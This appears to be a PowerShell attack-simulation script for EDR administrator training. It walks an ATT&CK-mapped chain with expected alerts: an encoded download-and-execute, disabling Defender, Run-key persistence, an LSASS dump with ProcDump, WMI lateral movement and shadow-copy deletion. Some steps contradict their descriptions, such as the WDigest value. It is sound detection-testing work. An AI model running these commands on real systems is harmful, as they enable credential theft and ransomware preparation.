# Datto EDR Attack Simulation - Administrator Certification Course
# This is a test script used to mimic an attack. 

# Validate script is run with admin
If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "[Error] You do not have Administrator rights to run this script!`nPlease re-run as an Administrator!"
    Start-Sleep 10
    return
}
# Validate Datto EDR is installed and running
$agent = Get-Service -Name HUNTAgent
if (-NOT $agent) {
    Write-Warning "[Warning] Datto EDR Agent is not installed!`n"
}
If ($agent.status -ne "Running") {
    Write-Warning "[Warning] Datto EDR Agent Service is installed but NOT running!`n"
}

#Define some randomness (useful for repeat runs)
$n = 1000+$(Get-Random -Max 999)


Write-Host "Starting Datto Attack Simulator"
New-Item -Path "$env:TEMP" -Name "test1" -ItemType "directory" -ErrorAction Ignore
$attackDir = "$env:TEMP\test1"


#Write-Host "Starting Single Endpoint Behavioral Attack Simulation."


#### INITIAL EXECUTION
Write-Host -ForegroundColor Cyan @'
=== Initial Access ===
ATT&CK Tactic: Initial Access
ATT&CK Technique: Phishing

    An email is recieved by accounting containing an attached PDF invoice.
    The email reads "Please find attached invoice for $120k USD for services rendered."
    This invoice is not expected by accounting so one of them downloads it to find out what it is referring to.

    ... The accountant downloads invoice.pdf to the downloads folder.

    This scenario we simulate that the file is not known by antivirus. 
    This is a common scenario as initial access trojans are quite simple and designed to evade.
'@
Write-Host -ForegroundColor Red @'
=== Attacker Perspective ===
ATT&CK Tactic: Defensive Evasion
ATT&CK Technique: Obfuscation - Hidden Double Extension (TXXXX)

    The PDF is not actually a PDF, its' an executable file with a hidden double extension. 
    Due to how Windows explorer defaults to hiding extensions for known files, 
    the user sees it show up as "invoice.pdf" instead of "invoice.pdf.exe". 
    Opening this file executes the exe which contains malicious instructions. 
'@
Write-Host -ForegroundColor Green @'
=== Defender Perspective ===
Expected Alerts: None

Explanation: This scenario we simulate that the file is not known by antivirus. 
This is a common scenario as initial access trojans are quite simple and designed to evade.
'@
Copy-Item -Path C:\Windows\System32\calc.exe -Destination "~\Desktop\invoice$($n).pdf.exe"
Start-Sleep 3
Start-Process -FilePath "~\Desktop\invoice$($n).pdf.exe"


Write-Host -ForegroundColor Cyan "... Sleeping for 10 seconds"
Start-Sleep 10


#### EXECUTION
Write-Host -ForegroundColor Cyan @'
=== Execution ===

    The PDF's Powershell script attempts to download the next component of malware. The script also contains a retry function
    in case the componant is caught by anti-virus. The attacker has multiple malware capabilities available to them
    so if one is caught, they will retry on another that might be better suited to the defenses of the target.

    In this scenario, we simulate the first sample being caught and then the retry succeeding with an executable 
    that is not flagged as malware by the antivirus.

'@
Write-Host -ForegroundColor Red @'
=== Attacker Perspective ===
ATT&CK Tactic: Execution
ATT&CK Technique: Command and Scripting Interpreter (T1059.001)
ATT&CK Link: https://attack.mitre.org/techniques/T1059/001

This executable bypasses detection because it's only function is to execute a line of Powershell.
The line of Powershell is known as a Download and Execute Harness that uses hidden flags and encoding to evade detection

Downloading known malware file that will likely get caught by antivirus...
 
'@
Write-Host -ForegroundColor Green @'
=== Defender Perspective ===
Expected Alert: [MEDIUM] (Execution-T1059.001) Detected use of hidden powershell base64 encoded command
Expected Alert: [HIGH] (Execution-TXXXX) Detected Powershell Download and Execute command
Expected Alert: [HIGH] AV Alert - Antivirus quarantines notebad.exe (Malware family: 'eicar')

Explanation: 

'@

#Invoke-WebRequest -Uri "https://www.eicar.org/download/eicar.com.txt" -OutFile "$attackDir\notebad.exe"
$Cmd = "(new-object System.Net.WebClient).DownloadFile('https://www.eicar.org/download/eicar.com.txt', '$attackDir\notebad.exe'); Start-Sleep -m $n"
$EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Cmd))
powershell.exe -NoP -e $EncodedCommand
#-win H

Write-Host -ForegroundColor Cyan "... Sleeping for 60 seconds"
#Start-Sleep 60


Write-Host -ForegroundColor Red "... Retrying but using unknown malware that bypasses antivirus"
Write-Host -ForegroundColor Green @'
=== Defender Perspective ===
Expected Behavioral Alert: [MEDIUM] (Execution-T1059.001) Detected use of hidden powershell base64 encoded command
Expected Behavioral Alert: [HIGH] (Execution-TXXXX) Detected Powershell Download and Execute command
Expected AV or Reputation Alert: None

Explanation: 

'@

$Cmd = "(new-object System.Net.WebClient).DownloadFile('https://live.sysinternals.com/psexec.exe', '$attackDir\notebad.exe'); Start-Sleep -m $n"
$EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Cmd))
powershell.exe -NoP -exec bypass -e $EncodedCommand
# -win H

Write-Host -ForegroundColor Cyan "... Sleeping for 60 seconds"
#Start-Sleep 60



# DISCOVERY
Write-Host -ForegroundColor Cyan @'
=== DISCOVERY ===

    When an adversary first gains access to a system, they often gather detailed information about the compromised system and network 
    including users, operating system, hardware, patches, and architecture. Adversaries may use the information to shape follow-on behaviors, 
    including whether or not to fully infect the target and/or attempt specific actions like a ransom.

'@
Write-Host -ForegroundColor Red @'
=== Attacker Perspective ===
ATT&CK Tactic: Discovery
ATT&CK Technique: System Information Discovery (T1082)
ATT&CK Link: https://attack.mitre.org/techniques/T1082

ATT&CK Tactic: Discovery
ATT&CK Technique: Remote System Discovery (T1018)
ATT&CK Link: https://attack.mitre.org/techniques/T1018

Attacker uses the newly downloaded malware to perform system and network discovery (who owns this system? what network? what company? Who are the administrators?) 

Additionally, the attacker needs to move to a more important server like the network's Domain Controller. 
To do so, the attacker must first enumerate nearby systems to determine what servers are available.

'@
Write-Host -ForegroundColor Green @'
=== Defender Perspective ===
Expected Alert: (Execution-TXXXX) Detected 
Expected Alert: (Execution-TXXXX) Detected

Explanation: 
'@


$cmd = @"
    '==== Hostname ====' > $attackDir\recon.txt
    Hostname >> $attackDir\recon.txt
    '' >> $attackDir\recon.txt
    '==== Whoami ====' >> $attackDir\recon.txt
    whoami >> $attackDir\recon.txt
    '' >> $attackDir\recon.txt
    '==== MachineGuid (best unique id to use) ====' >> $attackDir\recon.txt
    REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid >> $attackDir\recon.txt
    '' >> $attackDir\recon.txt
    '==== Antivirus Product ====' >> $attackDir\recon.txt
    WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,pathToSignedProductExe,pathToSignedReportingExe,productState 2>&1 >> $attackDir\recon.txt
    '' >> $attackDir\recon.txt
    '==== System Info ====' >> $attackDir\recon.txt
    #Systeminfo >> $attackDir\recon.txt
    '' >> $attackDir\recon.txt
    '==== Local Administrators ====' >> $attackDir\recon.txt
    net localgroup administrators 2>&1 >> $attackDir\recon.txt 
    '' >> $attackDir\recon.txt
    '==== Domain Administrators ====' >> $attackDir\recon.txt
    net group 'domain admins' /domain 2>&1 >> $attackDir\recon.txt 
    '' >> $attackDir\recon.txt
    '==== Exchange Administrators ====' >> $attackDir\recon.txt
    net group 'Exchange Trusted Subsystem' /domain 2>&1 >> $attackDir\recon.txt
    Start-Sleep -m $n
"@
Powershell.exe -NoP -exec bypass  -command $cmd
Start-Sleep 3
#Remove-item $attackDir\recon.txt -ErrorAction Ignore -force

Write-Host -ForegroundColor Red "[DISCOVERY] Attacker continues with remote system discovery of the surrounding network"
$cmd = @"
    '==== Terminal Services Remote Host List (who has this system remoted into?) ====' >> $attackDir\recon.txt
    reg query 'HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default' 2>&1 >> $attackDir\recon.txt
    '' >> $attackDir\recon.txt
    '==== Domain Controllers ====' >> $attackDir\recon.txt
    net group "domain controllers" /domain 2>&1 >> $attackDir\recon.txt 
    '' >> $attackDir\recon.txt
    '==== Local Network Systems ====' >> $attackDir\recon.txt
    net view /all /domain 2>&1 >> $attackDir\recon.txt
    Start-Sleep -m $n
"@
Powershell.exe -NoP -exec bypass  -command $cmd
#Remove-item $attackDir\recon2.txt -ErrorAction Ignore -force

Write-Host -ForegroundColor Cyan "... Sleeping for 60 seconds"
#Start-Sleep 60


# DEFENSIVE EVASION
Write-Host -ForegroundColor Cyan @'
=== DEFENSE EVASION ===

    In modern staged cyber attacks, attackers have many different types of malware and malicious actions at their disposal. 
    Some are more malicious than others and often malware that is known by security products are reused due to their complexity.

    Ransomware, for instance, utilizes advanced encryption methods that are outside the scope of the average attacker so they don't change
    very often. Disabling security tools or reducing the security posture of the system prior to deploying these samples makes it possible
    to reuse these samples.

    Defense Evasion tactics also reduce the security posture of the system and make it vulnerable to privilege escalation or further malicious actions

'@
Write-Host -ForegroundColor Red @'
=== Attacker Perspective ===
ATT&CK Tactic: Defense Evasion
ATT&CK Technique: Disabling Security Tools (T1089)
ATT&CK Link: https://attack.mitre.org/techniques/T1018

Assuming the built-in Windows Defender is being used, the attacker attempts to disabling Defender (in two different ways). 

'@
Write-Host -ForegroundColor Green @'
=== Defender Perspective ===
Expected Behavioral Alert: [HIGH] Detected attempt to disable Windows Defender Antivirus.

Explanation: This alert can occur from either successful disabling or just attempts. Windows defender
is present on every system regardless of what AV is installed and active on the system so attackers 
often target it by default.

'@

$cmd = "Set-MpPreference -DisableRealtimeMonitoring `$true; Start-Sleep -m $n"
powershell.exe -exec bypass -NoP -command $cmd
# -Win H
sc.exe config WinDefend start= disabled 2>$null
sc.exe stop WinDefend 2>$null

Write-Host -ForegroundColor Cyan "... Sleeping for 60 seconds"
#Start-Sleep 60


#### PERSISTENCE
Write-Host -ForegroundColor Cyan @'
=== Persistance Phase ===

'@
Write-Host -ForegroundColor Red @'
=== Attacker Perspective ===
ATT&CK Tactic: Persistance
ATT&CK Technique: Run Key (T1547.001)
ATT&CK Link: https://attack.mitre.org/techniques/T1547/001

    Attacker desires to stay connected to the system and can't trust the user to click the fake pdf again. 
    So they add a foothold to ensure the compromised system will reconnect to the attacker if rebooted or logged out.
    Attacker adds a reference to their malware in the registry run keys which will execute on every log in
 
'@
Write-Host -ForegroundColor Green @'
=== Defender Perspective ===
Expected Alerts: Expected Alert: [LOW] (Execution-T1547.001) Detected New Run Key

Explanation: Runkeys are one of the top 3 autostart mechanisms used by attackers to leave a foothold. 
Because they are used so often by regular software, the detection of a new runkey by itself is not 
malicious and would not raise alarms.  

This indicator is most useful in correlation, confirmation and attacker activity tracing.

The runkey references a file on disk or a command to run which 
will be analyzed seperately and may or may not cause additional alarms to be thrown.

'@

Write-Host ""
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Notepad" /t REG_SZ /F /D "$attackDir\notebad.exe -i $n"
Start-Sleep 2
# Cleanup
#REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Notepad" /f 2>$null

Write-Host -ForegroundColor Cyan "... Sleeping for 60 seconds"
#Start-Sleep 60


# CREDENTIAL
Write-Host -ForegroundColor Cyan @'
=== Credential Access ===

    Like many users in small companies, the IT department granted the permissions to elevate
    to Local Administrator so that they can install their own applications for their job.  

    Although this is not the most secure way to do it, it is common in many businesses because
    centrally managing everyone's software needs has high overhead.

    Luckily, the accountant does not have domain administrator permissions so cannot grant the 
    attacker the ability to move off this system.

    Additionally, there are no passwords to dump from admins who have logged onto this system present in
    in memory.

    Attacker knows from discovery that they do not have domain administrator and 
    there are no active domain admin accounts to steal. 
    So the attacker sets up a trap for an IT Admin.

'@
Write-Host -ForegroundColor Red @'
=== Attacker Perspective ===
ATT&CK Tactic: Credential Access
ATT&CK Technique:  Credential Harvesting (T1003)
  
    By enabling the Windows Digest Authentication method, it will create an insecure configuration 
    which will cause any password an admin uses to be stored in plain text on the system.

    After enabling, the attacker will cause issues with Outlook and give the user a popup warning
    telling them it is vulnerable and requires an admin to log in and update it before using it again.

'@
Write-Host -ForegroundColor Green @'
=== Defender Perspective ===
Expected Alert: [HIGH] (Credential-T1003) Detected WDigest insecure configuration setting enabled - plaintext passwords exposed

Explanation: This setting is off by default. This setting is often enabled by hackers to cause passwords used to log into this system to be stored in cleartext.
A hacker can than capture these passwords and misuse them in the rest of their attack.

'@
reg add HKLM\SYSTEM\CurrentControlSet\Control\Security\Providers\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
Start-Sleep 3



Write-Host -ForegroundColor Red @'
=== Attacker Perspective ===
ATT&CK Tactic: Credential Access
ATT&CK Technique:  Credential Harvesting (T1003)
  
    To solicit an administrator to enter their credentials, the user will cause problems with
    a critical application like Outlook. 

    After crashing Outlook twice, the attacker will display a warning popup telling them it is 
    vulnerable and requires an admin to log in and update it before using it again.

    Once the admin logs in, the attacker can simply grab passwords from memory using Mimikatz or
    a windows utility like ProcDump.
    
'@
Write-Host -ForegroundColor Green @'
=== Defender Perspective ===
Expected Alert: [INFO] A Service was stopped

Explanation: A non-alerting activity will be logged and available for correlation or investigation of
attacker activity.

'@

Write-Host ""
Get-Process Outlook | Stop-Process
Start-Sleep 10
Get-Process Outlook | Stop-Process
# Print message telling them Outlook is vulnerable and they should contact an IT Adminstrator before using it again."
Write-Host "WARNING: Outlook is running a vulnerable version and is susceptable to attack. Please contact your administrator to update the version before using it again."

Write-Host -ForegroundColor Cyan "... Sleeping for 3600 seconds"
#Start-Sleep 3600 # 1 hour


# Procdump
Write-Host -ForegroundColor Red @'
=== Attacker Perspective ===
ATT&CK Tactic: Credential Access
ATT&CK Technique:  Credential Harvesting (T1003)
  
    Following the log in of an admin while Windows Digest Authentication is turned on, administrative passwords 
    will now be stored in memory in cleartext. 

    The attacker now simply uses a built-in Windows debugging utility called ProcDump.exe to grab the memory of the
    Windows Authentication Authority (LSASS) which stores these passwords.

    ... Dumping LSASS memory with ProcDump.exe to extract passwords and tokens

'@
Write-Host -ForegroundColor Green @'
=== Defender Perspective ===
Expected Alert: [HIGH] (Credential-T1003) Detected password theft using ProcDump.exe

Explanation: ProcDump is an approved and built-in Windows utility so will be allowed by the system and protection software.
This rule alerts you to the use of Procdump against the local authentication authority process, LSASS, which is highly dangerous.

'@
Invoke-WebRequest -Uri "http://live.sysinternals.com/procdump.exe" -OutFile "$AttackDir\procdump.exe"
Start-Sleep 1
& $AttackDir\procdump.exe -ma lsass.exe lsass.dmp -accepteula #-dc $n
Start-Sleep 5
Remove-Item "$attackDir\lsass.dmp" -Force -ErrorAction Ignore

Write-Host -ForegroundColor Cyan "... Sleeping for 60 seconds"
#Start-Sleep 60


# LATERAL MOVEMENT
Write-Host -ForegroundColor Cyan @'
=== Lateral Movement ===

    With domain administrator credentials in hand, the attacker is now free to move off the 
    accountant's system and onto the domain controller where they can cause havok on any system
    in the domain.

'@
Write-Host -ForegroundColor Red @'
=== Attacker Perspective ===
ATT&CK Tactic: Lateral Movement
ATT&CK Technique: Remote Services - Windows Management Interface

    The attacker selected Windows Management Interface (WMI) which allows remote commands
    on Windows based systems within a domain. 

'@
Write-Host -ForegroundColor Green @'
=== Defender Perspective ===
Expected Alerts: (Lateral-TXXXX) Detected 

Explanation: The execution of these commands using valid credentials will not trigger any preventative 
security controls. 
Behavioral monitoring using EDR will give visibility and alert to potentially suspicious commands.

'@
wmic /node:targetcomputername process call create 'powershell.exe -command {$a = "EICARTES"; $a+= "T"; cmd.exe /c echo $a}' 2>$null

Write-Host -ForegroundColor Cyan "... Sleeping for 60 seconds"
#Start-Sleep 60


#### IMPACT
Write-Host -ForegroundColor Cyan @'
=== IMPACT Phase ===

    Once compromise of the network is fully complete and administrative control over the network is achieved,
    the attacker is free to perform their objectives. In this case, the attacker's intention is to 
    encrypt everyone's data and demand a ransom for the decryption key. 

    As the goal is to encrypt all files and issue a ransom for the return of those files, the attacker
    must disable any chances that the victim can recover their files on their own. 
    Disabling recovery features and deleting backups of any files like the built-in Windows Shadow Copy
    are necessary to accomplish this goal.

'@
Write-Host -ForegroundColor Red @'
=== Attacker Perspective ===
ATT&CK Tactic: IMPACT
ATT&CK Technique: Inhibit System Recovery (T1490)
ATT&CK Link: https://attack.mitre.org/techniques/T1490

    Attacker disables Windows built-in recovery features and deletes built-in backups of any files.
    The Windows Shadow Copy is a default Windows backup feature that is trivial to turn off once 
    the attackere has administrative rights.

    Unless the attacker has EDR, these actions should go unnoticed.
'@
Write-Host -ForegroundColor Green @'
=== Defender Perspective ===
Expected Alert: [HIGH] (Impact-T1490) Automatic Windows recovery features disabled 
Expected Alert: [HIGH] (Impact-T1490) Volume shadow copy was deleted

Explanation: As shown by MITRE ATT&CK, a common precurser to ransomware has been the deletion of backups and recovery features. 
If observed alone, there are some false positive sources such as software that requires these features to turn off to function
performantly, like databases.
'@

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f /i $n 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f /i $n 2>$null
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f /i $n 2>$null
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f /i $n 2>$null
vssadmin.exe delete shadows /All /Shadow=$n /quiet 2>$null


#### CLEAN UP
Write-Host "Cleaning up!"
Stop-Process -Name invoice* -Force -ErrorAction Ignore
Remove-Item "~\Downloads\invoice$($n).pdf.exe" -Force -ErrorAction Ignore

$cmd = "Set-MpPreference -DisableRealtimeMonitoring `$false;"
powershell.exe -exec bypass -NoP -command $cmd
# -Win H
sc.exe config WinDefend start= auto 2>$null
sc.exe start WinDefend 2>$null

#REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Notepad" /f 2>$null

Remove-item $attackDir\recon2.txt -ErrorAction Ignore -force

reg delete HKLM\SYSTEM\CurrentControlSet\Control\Security\Providers\WDigest /v UseLogonCredential /f

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "0" /f

Remove-Item -Path $attackDir -Recurse -force -ErrorAction Ignore